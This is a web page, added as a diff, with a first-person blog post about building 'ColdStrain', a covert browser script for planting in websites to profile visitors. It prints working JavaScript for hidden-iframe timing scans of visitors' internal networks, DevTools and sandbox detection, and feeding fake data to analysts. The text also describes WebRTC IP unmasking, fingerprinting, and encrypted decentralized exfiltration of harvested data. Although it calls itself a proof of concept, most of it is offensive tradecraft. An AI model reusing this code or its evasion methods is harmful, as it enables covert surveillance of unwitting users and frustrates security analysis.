@@ -1,0 +1,201 @@
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>A Nice Dose Web based Reconnaissance</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div id="main-page">
+        
+        <div class="layout-wrapper">
+            <main class="container">
+                
+                <a href="index.html" style="display: inline-block; background: none; border: 1px solid var(--button-border); color: var(--text-color); cursor: pointer; padding: 5px 10px; margin-bottom: 20px; font-family: inherit; text-decoration: none; border-radius: 4px;">
+                    ← Back
+                </a>
+                
+                <h1 style="color: var(--heading-color); margin-bottom: 10px;">A Nice Dose of Web based Reconnaissance</h1>
+                
+                <div style="color: var(--link-color); font-size: 12px; margin-bottom: 30px; font-family: monospace;">Published: 2026 April 19</div>
+                
+                <div id="article-content" class="article-content">
+                    <p>So after the leak and stuff, i had developed a feeling for security and stuff, and a fter a bit of thinking i had decided to make a web-based reconaissance tool(well legally a PoC) which i had decided to be able to aggressively gather data and would work in background in maximum stealth.</p>
+            <p>after staring at the wall for sometime, i had developed the bigger picture, that the tool would be in the form of a JS script Or a library which would be pretty easy to plug in a website, basically that the tool could be planted easily in a website which would then start doing the recon on each user or the target whi visited it. but for this i had to exploit something in the browser,as this should be stealty and aggressive and shouldn't be like nMAP which anybody who know a bit of networking could detect with a nice firewall. so after some digging, i decided that i'd use 'the supreme IP leaker of browsers', <code>WebRTC</code>, and here i would exploit the flaws of WebRTC to get the recon working and use other browser APIs. and here the tool would establish a dummy WebRTC channel with the target which then would increase the trust of the browser and then would harvest as much as possible through that.</p>
+            <p>then i started with the classic IP leaker feature, which RTC was notoriously known for. unfortunately the latest versions of Chrome and Safari and hardened ones like Firefox and Brave had had enough of WebRTC and had either sidelined the API or had patched the issue, and here i couldn't do the simple raw local IP grab as the vendors had now used a thing called <code>multicastDNS</code> or <code>mDNS(RFC6762)</code>, and this masks the local IP with an encoded string with a <code>.local</code> suffix, hence now unreadable for the tool and i knew about the age old technique of getting media permission to force the browser into unmasking the IP(here the browser is tricked as usually WebRTC and media permission usually means that a video con or something is going on and the browser will unmask the IP for <i>'the best possible streaming quality'</i>) but currently it was only working smoothly for Chrome and Chromium based browsers and stuff like Firefox and Safari had made that, even if media permission is given unmasking wouldn't be done default unless with some enterprise config, so I had to add the 'loud' feature of media permission, but it was kinda a partial win for me as most people use Chrome and most people give media permissions and even if it's not given the other info would still be there and the users would just shrug it off as 'normal'.</p>
+            <p>then i added the other features like the detection of VPN through using <code>WebGL</code>to find if the target's GPU, and as most servers use GPUs like SwiftShader and home PCs use stuff like an Nvidia RTX, it would be a very strong identifier. and then i added features which used things like <code>Canvas Fingerprinting</code> and <code>WebCodecs</code> to get hardware-level info.</p>
+            <p>one of my favorite processes in this tool was the LAN mapping process, it was not like your usual LAN mapping where you have a bunch of common ISP IPs which you use to hit the router. but here it's pretty clever, the script starts with a hardcoded <code>Set</code> of the most common default gateways used by home and corporate routers.</p>
+            <pre>192.168.1.1 192.168.0.1 10.0.0.1</pre>
+            <p>then it's the 'adaptation' to the environment, it looks at the local IP it harvested during the WebRTC phase(<code>this.localInterfaces</code>), then it uses the <code>.split('.')</code> method:</p>
+            <ol>
+            <li>it takes the local IP(eg., 192.168.50.15).</li>
+            <li>it splits it into four parts(octets): ['192', '168', '50', '15'].</li>
+            <li>it slices off the first three: ['192', '168', '50'].</li>
+            <li>It rejoins them to create the subnet prefix: 192.168.50.</li>
+            </ol>
+            <p>once it has your subnet, it guesses where the router or other infrastructure might be by appending common suffixes: .1, .254, and .100. So, if your IP is 192.168.50.15, it automatically adds 192.168.50.1, 192.168.50.254, and 192.168.50.100 to its target list.</p>
+            <p>but the script doesn't just ping the IPs(which JS usually can't do). it uses two "error-based" detection methods, in the first method it attempts a <code>fetch()</code> to the target IP with the <code>no-cors</code> mode. even though the browser blocks the script from reading the content of the router's login page (due to CORS), the script can still see <b>how</b> the request failed. and in the result, if it gets a "Connection Refused" error quickly, it knows a device is there. if it simply "Times Out," it assumes no device is at that IP. in the second method, as this is is a fallback, it is even more subtle. It creates a hidden <code>iframe</code> and points its <code>src</code> to the target IP on an obscure port (like <code>:31337</code>). it starts a timer using <code>performance.now()</code>. and in the detection, a live host will respond (even with an "Error: Reset" or "Refused") much faster than a non-existent host. if the <code>onerror</code> fires in under 1.4 seconds, the script flags that IP as <b>"ALIVE (Timing Bypass)."</b> by doing this, the script builds a map of the internal network without ever needing specialized permissions or complex pattern matching. It's essentially using the browser's own security errors as a radar.</p>
+<pre style="font-family:monospace;color: rgb(216, 222, 233); background-color: rgb(46, 52, 64); font-weight: 400; "><span style="color: rgb(76, 86, 106); font-weight: 400;">// Phase 1: Establish baseline and adapt to discovered local subnet</span>
+<span style="color: rgb(129, 161, 193); font-weight: 400;">const</span> gateways = <span style="color: rgb(129, 161, 193); font-weight: 400;">new</span> <span style="color: rgb(143, 188, 187); font-weight: 400;">Set</span>([<span style="color: rgb(163, 190, 140); font-weight: 400;">'192.168.1.1'</span>, <span style="color: rgb(163, 190, 140); font-weight: 400;">'192.168.0.1'</span>, <span style="color: rgb(163, 190, 140); font-weight: 400;">'10.0.0.1'</span>]);
+
+<span style="color: rgb(216, 222, 233); font-weight: 400;">this</span>.<span style="color: rgb(136, 192, 208); font-weight: 400;">localInterfaces</span>.<span style="color: rgb(143, 188, 187); font-weight: 400;">forEach</span>(<span style="color: rgb(136, 192, 208); font-weight: 400;"><span style="color: rgb(216, 222, 233); font-weight: 400;">ip</span> =&gt;</span> {
+    <span style="color: rgb(76, 86, 106); font-weight: 400;">// Ensure we have a raw IPv4 address, not a masked mDNS (.local)</span>
+    <span style="color: rgb(129, 161, 193); font-weight: 400;">if</span> (ip.<span style="color: rgb(143, 188, 187); font-weight: 400;">includes</span>(<span style="color: rgb(163, 190, 140); font-weight: 400;">'.'</span>) &amp;&amp; !ip.<span style="color: rgb(143, 188, 187); font-weight: 400;">endsWith</span>(<span style="color: rgb(163, 190, 140); font-weight: 400;">'.local'</span>)) {
+        <span style="color: rgb(129, 161, 193); font-weight: 400;">const</span> octets = ip.<span style="color: rgb(143, 188, 187); font-weight: 400;">split</span>(<span style="color: rgb(163, 190, 140); font-weight: 400;">'.'</span>);
+        <span style="color: rgb(129, 161, 193); font-weight: 400;">if</span> (octets.<span style="color: rgb(136, 192, 208); font-weight: 400;">length</span> === <span style="color: rgb(180, 142, 173); font-weight: 400;">4</span>) {
+            <span style="color: rgb(76, 86, 106); font-weight: 400;">// Slice the first three octets to get the subnet prefix</span>
+            <span style="color: rgb(129, 161, 193); font-weight: 400;">const</span> subnet = octets.<span style="color: rgb(143, 188, 187); font-weight: 400;">slice</span>(<span style="color: rgb(180, 142, 173); font-weight: 400;">0</span>, <span style="color: rgb(180, 142, 173); font-weight: 400;">3</span>).<span style="color: rgb(143, 188, 187); font-weight: 400;">join</span>(<span style="color: rgb(163, 190, 140); font-weight: 400;">'.'</span>);
+            
+            <span style="color: rgb(76, 86, 106); font-weight: 400;">// Append common gateway addresses</span>
+            gateways.<span style="color: rgb(143, 188, 187); font-weight: 400;">add</span>(<span style="color: rgb(163, 190, 140); font-weight: 400;">`<span style="color: rgb(216, 222, 233); font-weight: 400;">${subnet}</span>.1`</span>);   <span style="color: rgb(76, 86, 106); font-weight: 400;">// Primary router guess</span>
+            gateways.<span style="color: rgb(143, 188, 187); font-weight: 400;">add</span>(<span style="color: rgb(163, 190, 140); font-weight: 400;">`<span style="color: rgb(216, 222, 233); font-weight: 400;">${subnet}</span>.254`</span>); <span style="color: rgb(76, 86, 106); font-weight: 400;">// Secondary common gateway</span>
+            gateways.<span style="color: rgb(143, 188, 187); font-weight: 400;">add</span>(<span style="color: rgb(163, 190, 140); font-weight: 400;">`<span style="color: rgb(216, 222, 233); font-weight: 400;">${subnet}</span>.100`</span>); <span style="color: rgb(76, 86, 106); font-weight: 400;">// Common DHCP start range</span>
+        }
+    }
+});
+
+<span style="color: rgb(129, 161, 193); font-weight: 400;">const</span> targetList = <span style="color: rgb(143, 188, 187); font-weight: 400;">Array</span>.<span style="color: rgb(143, 188, 187); font-weight: 400;">from</span>(gateways);</pre>
+<pre style="font-family:monospace;color: rgb(216, 222, 233); background-color: rgb(46, 52, 64); font-weight: 400; "><span style="color: rgb(76, 86, 106); font-weight: 400;">// Phase 3: Probe targets using Iframe Navigation Timing</span>
+<span style="color: rgb(129, 161, 193); font-weight: 400;">const</span> <span style="color: rgb(143, 188, 187); font-weight: 400;">probeIp</span> = <span style="color: rgb(129, 161, 193); font-weight: 400;">async</span> (<span style="color: rgb(216, 222, 233); font-weight: 400;">ip</span>) =&gt; {
+    <span style="color: rgb(129, 161, 193); font-weight: 400;">return</span> <span style="color: rgb(129, 161, 193); font-weight: 400;">new</span> <span style="color: rgb(143, 188, 187); font-weight: 400;">Promise</span>(<span style="color: rgb(136, 192, 208); font-weight: 400;">(<span style="color: rgb(216, 222, 233); font-weight: 400;">resolve</span>) =&gt;</span> {
+        <span style="color: rgb(129, 161, 193); font-weight: 400;">const</span> iframe = <span style="color: rgb(216, 222, 233); font-weight: 400;">document</span>.<span style="color: rgb(143, 188, 187); font-weight: 400;">createElement</span>(<span style="color: rgb(163, 190, 140); font-weight: 400;">'iframe'</span>);
+        iframe.<span style="color: rgb(136, 192, 208); font-weight: 400;">style</span>.<span style="color: rgb(136, 192, 208); font-weight: 400;">display</span> = <span style="color: rgb(163, 190, 140); font-weight: 400;">'none'</span>; <span style="color: rgb(76, 86, 106); font-weight: 400;">// Keep it hidden from the user</span>
+        
+        <span style="color: rgb(129, 161, 193); font-weight: 400;">const</span> start = performance.<span style="color: rgb(143, 188, 187); font-weight: 400;">now</span>();
+        
+        <span style="color: rgb(76, 86, 106); font-weight: 400;">// Failsafe timeout to clean up the DOM</span>
+        <span style="color: rgb(129, 161, 193); font-weight: 400;">const</span> timeoutId = <span style="color: rgb(143, 188, 187); font-weight: 400;">setTimeout</span>(<span style="color: rgb(136, 192, 208); font-weight: 400;">() =&gt;</span> {
+            <span style="color: rgb(129, 161, 193); font-weight: 400;">if</span> (<span style="color: rgb(216, 222, 233); font-weight: 400;">document</span>.<span style="color: rgb(136, 192, 208); font-weight: 400;">body</span>.<span style="color: rgb(143, 188, 187); font-weight: 400;">contains</span>(iframe)) <span style="color: rgb(216, 222, 233); font-weight: 400;">document</span>.<span style="color: rgb(136, 192, 208); font-weight: 400;">body</span>.<span style="color: rgb(143, 188, 187); font-weight: 400;">removeChild</span>(iframe);
+            <span style="color: rgb(143, 188, 187); font-weight: 400;">resolve</span>(); 
+        }, <span style="color: rgb(180, 142, 173); font-weight: 400;">1500</span>);
+
+        <span style="color: rgb(76, 86, 106); font-weight: 400;">// Listen for both onload and onerror to catch any response</span>
+        iframe.<span style="color: rgb(136, 192, 208); font-weight: 400;">onload</span> = iframe.<span style="color: rgb(136, 192, 208); font-weight: 400;">onerror</span> = <span style="color: rgb(136, 192, 208); font-weight: 400;">() =&gt;</span> {
+            <span style="color: rgb(129, 161, 193); font-weight: 400;">const</span> duration = performance.<span style="color: rgb(143, 188, 187); font-weight: 400;">now</span>() - start;
+            <span style="color: rgb(143, 188, 187); font-weight: 400;">clearTimeout</span>(timeoutId);
+            
+            <span style="color: rgb(129, 161, 193); font-weight: 400;">if</span> (<span style="color: rgb(216, 222, 233); font-weight: 400;">document</span>.<span style="color: rgb(136, 192, 208); font-weight: 400;">body</span>.<span style="color: rgb(143, 188, 187); font-weight: 400;">contains</span>(iframe)) <span style="color: rgb(216, 222, 233); font-weight: 400;">document</span>.<span style="color: rgb(136, 192, 208); font-weight: 400;">body</span>.<span style="color: rgb(143, 188, 187); font-weight: 400;">removeChild</span>(iframe);
+
+            <span style="color: rgb(76, 86, 106); font-weight: 400;">// If the browser threw an error faster than 1400ms, a device actively closed the connection</span>
+            <span style="color: rgb(129, 161, 193); font-weight: 400;">if</span> (duration &lt; <span style="color: rgb(180, 142, 173); font-weight: 400;">1400</span>) {
+                activeHosts.<span style="color: rgb(143, 188, 187); font-weight: 400;">push</span>({ <span style="color: rgb(143, 188, 187); font-weight: 400;">ip</span>: ip, <span style="color: rgb(143, 188, 187); font-weight: 400;">ms</span>: <span style="color: rgb(143, 188, 187); font-weight: 400;">Math</span>.<span style="color: rgb(143, 188, 187); font-weight: 400;">round</span>(duration), <span style="color: rgb(143, 188, 187); font-weight: 400;">status</span>: <span style="color: rgb(163, 190, 140); font-weight: 400;">"ALIVE (Timing Bypass)"</span> });
+            }
+            <span style="color: rgb(143, 188, 187); font-weight: 400;">resolve</span>();
+        };
+
+        <span style="color: rgb(216, 222, 233); font-weight: 400;">document</span>.<span style="color: rgb(136, 192, 208); font-weight: 400;">body</span>.<span style="color: rgb(143, 188, 187); font-weight: 400;">appendChild</span>(iframe);
+        <span style="color: rgb(76, 86, 106); font-weight: 400;">// Point to the target IP on a port unlikely to be open</span>
+        iframe.<span style="color: rgb(136, 192, 208); font-weight: 400;">src</span> = \<span style="color: rgb(163, 190, 140); font-weight: 400;">`http://\${ip}:31337\`; 
+    });
+};</span></pre>
+   <p>then i added the other features like NAT topology identification feature, then were several sophisticated anti-analysis features, the first was a <code>armOnMultiInteraction</code> method which ensured the payload doesn't fire in an automated sandbox (like VirusTotal or Joe Sandbox) as it required a stateful response human response of <code>mousemove</code>-><code>scroll</code>-><code>click</code>. then it verifies the <code>isTrusted</code> property on the click event to ensure it wasn't a programmatically generated click by a clanker, then there was a feature for <b>DevTools</b> detection where the code records the exact millisecond before and after a debugger; statement using <code>performance.now()</code>. in a normal environment, the script ignores this and executes it in less than a millisecond. If DevTools is open, the script halts execution. If the time delta exceeds 100ms, the script assumes a human is inspecting the code, and then a Chromium specific thing, the script creates a custom object with a modified <code>toString()</code> method that sets a flag (<code>detected = true</code>) when called. it then logs this object to the console using <code>console.log('%c', detector);</code>. in Chromium-based browsers (Chrome, Edge), the console automatically evaluates and stringifies objects to display them. if the console is closed, the object is never evaluated, and the trap remains untriggered. the second one is deceptive 'noise' method, where instead of terminating the script when analysis is detected (which is a strong indicator of malicious intent), ColdStrain utilizes <b>Dynamic Method Swapping</b> to feed the researcher fake data.</p>
+   <pre style="font-family:monospace;color: rgb(216, 222, 233); background-color: rgb(46, 52, 64); font-weight: 400; "><span style="color: rgb(129, 161, 193); font-weight: 400;">async</span> <span style="color: rgb(143, 188, 187); font-weight: 400;">_isDevToolsOpen</span>(<span style="color: rgb(216, 222, 233); font-weight: 400;"></span>) {
+        <span style="color: rgb(76, 86, 106); font-weight: 400;">// Trap 1: Execution pause (Works across all browsers)</span>
+        <span style="color: rgb(129, 161, 193); font-weight: 400;">const</span> start = performance.<span style="color: rgb(143, 188, 187); font-weight: 400;">now</span>();
+        <span style="color: rgb(129, 161, 193); font-weight: 400;">debugger</span>; 
+        <span style="color: rgb(129, 161, 193); font-weight: 400;">const</span> end = performance.<span style="color: rgb(143, 188, 187); font-weight: 400;">now</span>();
+        <span style="color: rgb(129, 161, 193); font-weight: 400;">if</span> (end - start &amp;gt; <span style="color: rgb(180, 142, 173); font-weight: 400;">100</span>) <span style="color: rgb(129, 161, 193); font-weight: 400;">return</span> <span style="color: rgb(129, 161, 193); font-weight: 400;">true</span>;
+
+        <span style="color: rgb(76, 86, 106); font-weight: 400;">// Trap 2: toString() evaluation (Only safe to run on Chromium-based browsers)</span>
+        <span style="color: rgb(129, 161, 193); font-weight: 400;">const</span> isChromium = !!<span style="color: rgb(216, 222, 233); font-weight: 400;">window</span>.<span style="color: rgb(136, 192, 208); font-weight: 400;">chrome</span>;
+        <span style="color: rgb(129, 161, 193); font-weight: 400;">if</span> (isChromium) {
+            <span style="color: rgb(129, 161, 193); font-weight: 400;">let</span> detected = <span style="color: rgb(129, 161, 193); font-weight: 400;">false</span>;
+            <span style="color: rgb(129, 161, 193); font-weight: 400;">const</span> detector = {
+                <span style="color: rgb(143, 188, 187); font-weight: 400;">toString</span>: <span style="color: rgb(136, 192, 208); font-weight: 400;">() =&gt;</span> { detected = <span style="color: rgb(129, 161, 193); font-weight: 400;">true</span>; <span style="color: rgb(129, 161, 193); font-weight: 400;">return</span> <span style="color: rgb(163, 190, 140); font-weight: 400;">'detector'</span>; }
+            };
+            <span style="color: rgb(216, 222, 233); font-weight: 400;">console</span>.<span style="color: rgb(143, 188, 187); font-weight: 400;">log</span>(<span style="color: rgb(163, 190, 140); font-weight: 400;">'%c'</span>, detector); 
+            <span style="color: rgb(129, 161, 193); font-weight: 400;">return</span> detected;
+        }
+    }</pre>
+<pre style="font-family:monospace;color: rgb(216, 222, 233); background-color: rgb(46, 52, 64); font-weight: 400; "><span style="color: rgb(216, 222, 233); font-weight: 400;">this</span>.<span style="color: rgb(136, 192, 208); font-weight: 400;">_noiseFunctions</span> = {
+    <span style="color: rgb(143, 188, 187); font-weight: 400;">harvest</span>: <span style="color: rgb(136, 192, 208); font-weight: 400;">() =&gt;</span> <span style="color: rgb(143, 188, 187); font-weight: 400;">Promise</span>.<span style="color: rgb(143, 188, 187); font-weight: 400;">resolve</span>({ <span style="color: rgb(143, 188, 187); font-weight: 400;">error</span>: <span style="color: rgb(163, 190, 140); font-weight: 400;">"ERR_ENCRYPT_FAIL"</span>, <span style="color: rgb(143, 188, 187); font-weight: 400;">nonce</span>: <span style="color: rgb(143, 188, 187); font-weight: 400;">Math</span>.<span style="color: rgb(143, 188, 187); font-weight: 400;">random</span>().<span style="color: rgb(143, 188, 187); font-weight: 400;">toString</span>(<span style="color: rgb(180, 142, 173); font-weight: 400;">36</span>) }),
+    <span style="color: rgb(143, 188, 187); font-weight: 400;">syncToMesh</span>: <span style="color: rgb(136, 192, 208); font-weight: 400;">() =&gt;</span> {},
+    <span style="color: rgb(143, 188, 187); font-weight: 400;">getDeepMediaTelemetry</span>: <span style="color: rgb(136, 192, 208); font-weight: 400;">() =&gt;</span> <span style="color: rgb(143, 188, 187); font-weight: 400;">Promise</span>.<span style="color: rgb(143, 188, 187); font-weight: 400;">resolve</span>({ <span style="color: rgb(143, 188, 187); font-weight: 400;">status</span>: <span style="color: rgb(163, 190, 140); font-weight: 400;">"IDLE"</span>, <span style="color: rgb(143, 188, 187); font-weight: 400;">hardware</span>: <span style="color: rgb(163, 190, 140); font-weight: 400;">"GENERIC_PnP"</span> })
+};</pre><pre style="font-family:monospace;color: rgb(216, 222, 233); background-color: rgb(46, 52, 64); font-weight: 400; "><span style="color: rgb(129, 161, 193); font-weight: 400;">async</span> <span style="color: rgb(143, 188, 187); font-weight: 400;">_checkIntegrity</span>(<span style="color: rgb(216, 222, 233); font-weight: 400;"></span>) {
+    <span style="color: rgb(129, 161, 193); font-weight: 400;">const</span> isOpen = <span style="color: rgb(129, 161, 193); font-weight: 400;">await</span> <span style="color: rgb(216, 222, 233); font-weight: 400;">this</span>.<span style="color: rgb(143, 188, 187); font-weight: 400;">_isDevToolsOpen</span>();
+
+    <span style="color: rgb(129, 161, 193); font-weight: 400;">if</span> (isOpen &amp;amp;&amp;amp; !<span style="color: rgb(216, 222, 233); font-weight: 400;">this</span>.<span style="color: rgb(136, 192, 208); font-weight: 400;">_isShielded</span>) {
+        <span style="color: rgb(216, 222, 233); font-weight: 400;">this</span>.<span style="color: rgb(143, 188, 187); font-weight: 400;">_applyNoise</span>();
+    } <span style="color: rgb(129, 161, 193); font-weight: 400;">else</span> <span style="color: rgb(129, 161, 193); font-weight: 400;">if</span> (!isOpen &amp;amp;&amp;amp; <span style="color: rgb(216, 222, 233); font-weight: 400;">this</span>.<span style="color: rgb(136, 192, 208); font-weight: 400;">_isShielded</span>) {
+        <span style="color: rgb(216, 222, 233); font-weight: 400;">this</span>.<span style="color: rgb(143, 188, 187); font-weight: 400;">_restoreLogic</span>();
+    }
+}
+
+<span style="color: rgb(143, 188, 187); font-weight: 400;">_applyNoise</span>(<span style="color: rgb(216, 222, 233); font-weight: 400;"></span>) {
+    <span style="color: rgb(216, 222, 233); font-weight: 400;">this</span>.<span style="color: rgb(136, 192, 208); font-weight: 400;">_isShielded</span> = <span style="color: rgb(129, 161, 193); font-weight: 400;">true</span>;
+
+    <span style="color: rgb(143, 188, 187); font-weight: 400;">Object</span>.<span style="color: rgb(143, 188, 187); font-weight: 400;">keys</span>(<span style="color: rgb(216, 222, 233); font-weight: 400;">this</span>.<span style="color: rgb(136, 192, 208); font-weight: 400;">_noiseFunctions</span>).<span style="color: rgb(143, 188, 187); font-weight: 400;">forEach</span>(<span style="color: rgb(136, 192, 208); font-weight: 400;"><span style="color: rgb(216, 222, 233); font-weight: 400;">m</span> =&gt;</span> {
+        <span style="color: rgb(216, 222, 233); font-weight: 400;">this</span>[m] = <span style="color: rgb(216, 222, 233); font-weight: 400;">this</span>.<span style="color: rgb(136, 192, 208); font-weight: 400;">_noiseFunctions</span>[m];
+    });
+}
+</pre><pre style="font-family:monospace;color: rgb(216, 222, 233); background-color: rgb(46, 52, 64); font-weight: 400; "><span style="color: rgb(143, 188, 187); font-weight: 400;">armOnMultiInteraction</span>(<span style="color: rgb(216, 222, 233); font-weight: 400;"></span>) {
+    <span style="color: rgb(129, 161, 193); font-weight: 400;">let</span> interactionState = <span style="color: rgb(180, 142, 173); font-weight: 400;">0</span>;
+    <span style="color: rgb(129, 161, 193); font-weight: 400;">let</span> sequenceTimeout = <span style="color: rgb(129, 161, 193); font-weight: 400;">null</span>;
+
+    <span style="color: rgb(129, 161, 193); font-weight: 400;">const</span> <span style="color: rgb(143, 188, 187); font-weight: 400;">resetSequence</span> = (<span style="color: rgb(216, 222, 233); font-weight: 400;"></span>) =&gt; {
+        <span style="color: rgb(129, 161, 193); font-weight: 400;">if</span> (interactionState &amp;gt; <span style="color: rgb(180, 142, 173); font-weight: 400;">0</span>) {
+            
+        }
+        interactionState = <span style="color: rgb(180, 142, 173); font-weight: 400;">0</span>;
+        <span style="color: rgb(129, 161, 193); font-weight: 400;">if</span> (sequenceTimeout) {
+            <span style="color: rgb(143, 188, 187); font-weight: 400;">clearTimeout</span>(sequenceTimeout);
+            sequenceTimeout = <span style="color: rgb(129, 161, 193); font-weight: 400;">null</span>;
+        }
+    };
+
+    <span style="color: rgb(129, 161, 193); font-weight: 400;">const</span> <span style="color: rgb(143, 188, 187); font-weight: 400;">triggerRecon</span> = <span style="color: rgb(129, 161, 193); font-weight: 400;">async</span> (<span style="color: rgb(216, 222, 233); font-weight: 400;"></span>) =&gt; {
+        <span style="color: rgb(216, 222, 233); font-weight: 400;">console</span>.<span style="color: rgb(143, 188, 187); font-weight: 400;">log</span>(<span style="color: rgb(163, 190, 140); font-weight: 400;">"[!] Complex human interaction verified. Executing payload..."</span>);
+        
+        <span style="color: rgb(216, 222, 233); font-weight: 400;">window</span>.<span style="color: rgb(143, 188, 187); font-weight: 400;">removeEventListener</span>(<span style="color: rgb(163, 190, 140); font-weight: 400;">'mousemove'</span>, handleMouse);
+        <span style="color: rgb(216, 222, 233); font-weight: 400;">window</span>.<span style="color: rgb(143, 188, 187); font-weight: 400;">removeEventListener</span>(<span style="color: rgb(163, 190, 140); font-weight: 400;">'scroll'</span>, handleScroll);
+        <span style="color: rgb(216, 222, 233); font-weight: 400;">window</span>.<span style="color: rgb(143, 188, 187); font-weight: 400;">removeEventListener</span>(<span style="color: rgb(163, 190, 140); font-weight: 400;">'click'</span>, handleClick);
+        <span style="color: rgb(143, 188, 187); font-weight: 400;">clearTimeout</span>(sequenceTimeout);
+        
+        <span style="color: rgb(129, 161, 193); font-weight: 400;">try</span> {
+            <span style="color: rgb(129, 161, 193); font-weight: 400;">await</span> <span style="color: rgb(216, 222, 233); font-weight: 400;">this</span>.<span style="color: rgb(143, 188, 187); font-weight: 400;">syncToMesh</span>();
+            
+        } <span style="color: rgb(129, 161, 193); font-weight: 400;">catch</span> (error) { }
+    };
+
+    <span style="color: rgb(129, 161, 193); font-weight: 400;">const</span> <span style="color: rgb(143, 188, 187); font-weight: 400;">handleMouse</span> = (<span style="color: rgb(216, 222, 233); font-weight: 400;"></span>) =&gt; {
+        <span style="color: rgb(129, 161, 193); font-weight: 400;">if</span> (interactionState === <span style="color: rgb(180, 142, 173); font-weight: 400;">0</span>) {
+            interactionState = <span style="color: rgb(180, 142, 173); font-weight: 400;">1</span>; 
+            sequenceTimeout = <span style="color: rgb(143, 188, 187); font-weight: 400;">setTimeout</span>(resetSequence, <span style="color: rgb(180, 142, 173); font-weight: 400;">5000</span>); 
+        }
+    };
+
+    <span style="color: rgb(129, 161, 193); font-weight: 400;">const</span> <span style="color: rgb(143, 188, 187); font-weight: 400;">handleScroll</span> = (<span style="color: rgb(216, 222, 233); font-weight: 400;"></span>) =&gt; {
+        <span style="color: rgb(129, 161, 193); font-weight: 400;">if</span> (interactionState === <span style="color: rgb(180, 142, 173); font-weight: 400;">1</span>) {
+            interactionState = <span style="color: rgb(180, 142, 173); font-weight: 400;">2</span>; 
+        }
+    };
+
+    <span style="color: rgb(129, 161, 193); font-weight: 400;">const</span> <span style="color: rgb(143, 188, 187); font-weight: 400;">handleClick</span> = (<span style="color: rgb(216, 222, 233); font-weight: 400;">event</span>) =&gt; {
+        <span style="color: rgb(129, 161, 193); font-weight: 400;">if</span> (interactionState === <span style="color: rgb(180, 142, 173); font-weight: 400;">2</span>) {
+            <span style="color: rgb(129, 161, 193); font-weight: 400;">if</span> (event.<span style="color: rgb(136, 192, 208); font-weight: 400;">isTrusted</span> &amp;amp;&amp;amp; (event.<span style="color: rgb(136, 192, 208); font-weight: 400;">clientX</span> !== <span style="color: rgb(180, 142, 173); font-weight: 400;">0</span> || event.<span style="color: rgb(136, 192, 208); font-weight: 400;">clientY</span> !== <span style="color: rgb(180, 142, 173); font-weight: 400;">0</span>)) {
+                <span style="color: rgb(143, 188, 187); font-weight: 400;">triggerRecon</span>();
+            } <span style="color: rgb(129, 161, 193); font-weight: 400;">else</span> {
+                <span style="color: rgb(143, 188, 187); font-weight: 400;">resetSequence</span>();
+            }
+        }
+    };
+
+    <span style="color: rgb(216, 222, 233); font-weight: 400;">window</span>.<span style="color: rgb(143, 188, 187); font-weight: 400;">addEventListener</span>(<span style="color: rgb(163, 190, 140); font-weight: 400;">'mousemove'</span>, handleMouse);
+    <span style="color: rgb(216, 222, 233); font-weight: 400;">window</span>.<span style="color: rgb(143, 188, 187); font-weight: 400;">addEventListener</span>(<span style="color: rgb(163, 190, 140); font-weight: 400;">'scroll'</span>, handleScroll, { <span style="color: rgb(143, 188, 187); font-weight: 400;">passive</span>: <span style="color: rgb(129, 161, 193); font-weight: 400;">true</span> }); 
+    <span style="color: rgb(216, 222, 233); font-weight: 400;">window</span>.<span style="color: rgb(143, 188, 187); font-weight: 400;">addEventListener</span>(<span style="color: rgb(163, 190, 140); font-weight: 400;">'click'</span>, handleClick);
+}</pre>
+   <p>then it was the logic for the exfiltration of the data harvested to the fetcher or the dashboard which would be a site, and the thing i did made it extremely difficult to block the data transmission, as i used <code>Gun.js</code> database for the job, and because of this the whole thing would be decentralized, and instead of sending data to a central C2 server that can be easily blacklisted by DNS, it used a decentralized graph database. and before exfiltration, it uses the Web Crypto API to perform a hybrid encryption (RSA-OAEP for the key wrap and AES-GCM for the payload chunks). this ensured that even if the network traffic is captured, the data remained unreadable without the private key.</p>
+             <p>but then i found that these techniques or at least the ones which leaked important stuff, could be mitigated in the modern web, so i made it a bit more robust, in which i added more newer and more subtle fallback features for several features which made the whole thing even more robust and difficult to mitigate, like i added the <code>WebGPU</code> fingerprinting as a fallback for WebGL, made the VPN detection a multi feature process where different ways where used to get the data for the VPN detection,as a step by step process and added a new <code>MTU</code> analysis feature with <code>WebTransport</code> which more difficult to catch.</p>
+             <p>and with all these stuff, and 5 days of work, i created ColdStrain and ngl it was pretty sophisticated and effective for a web-based reconaissance tool....dw i didn't use it in this site, i really value privacy this was just a PoC for seeing how much of we could leak from a browser if we asked nicely.</p>
+                </div>
+
+            </main>
+
+            
+
+
+    </div>
+</body>
+</html>
